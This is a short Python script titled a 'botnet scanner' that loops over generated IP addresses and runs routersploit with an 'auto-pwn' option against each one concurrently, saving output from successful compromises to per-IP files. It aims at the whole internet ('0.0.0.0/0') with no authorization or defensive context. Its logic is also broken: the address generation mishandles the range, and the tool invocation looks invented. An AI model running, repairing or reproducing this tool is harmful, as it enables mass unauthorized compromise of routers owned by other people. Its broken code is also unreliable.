import subprocess
import os
from multiprocessing.dummy import Pool as ThreadPool

def botnet_scanner():
    # Define the IP range to scan (adjust according to your requirements)
    ip_range = "0.0.0.0/0"

    # Generate the IP addresses within the range to scan
    ip_addresses = generate_ip_addresses(ip_range)

    # Create a thread pool to execute routersploit with auto pwn on multiple IP addresses concurrently
    pool = ThreadPool(10)  # Adjust the number of threads as needed

    # Execute routersploit with auto pwn on each IP address using multiple threads
    results = pool.map(scan_ip, ip_addresses)
    pool.close()
    pool.join()

    # Save the successful autopwn results to a file
    save_results(results)

def scan_ip(ip):
    command = f"routersploit --target {ip} --auto-pwn"
    output = subprocess.check_output(command, shell=True).decode("utf-8")

    # Check if the output contains successful autopwn results
    if "Autopwn completed successfully" in output:
        return (ip, output)
    else:
        return None

def save_results(results):
    # Create a directory to save the successful autopwn results
    directory = "autopwn_results"
    if not os.path.exists(directory):
        os.makedirs(directory)

    # Save each successful autopwn result to a separate file
    for result in results:
        if result is not None:
            ip = result[0]
            output = result[1]

            filename = f"{directory}/{ip}.txt"
            with open(filename, "w") as file:
                file.write(output)

def generate_ip_addresses(ip_range):
    ip_addresses = []
    octets = ip_range.split('.')

    for i in range(256):
        for j in range(256):
            for k in range(256):
                ip = f"{octets[0]}.{i}.{j}.{k}"
                ip_addresses.append(ip)

    return ip_addresses

# Run the botnet scanner
botnet_scanner()
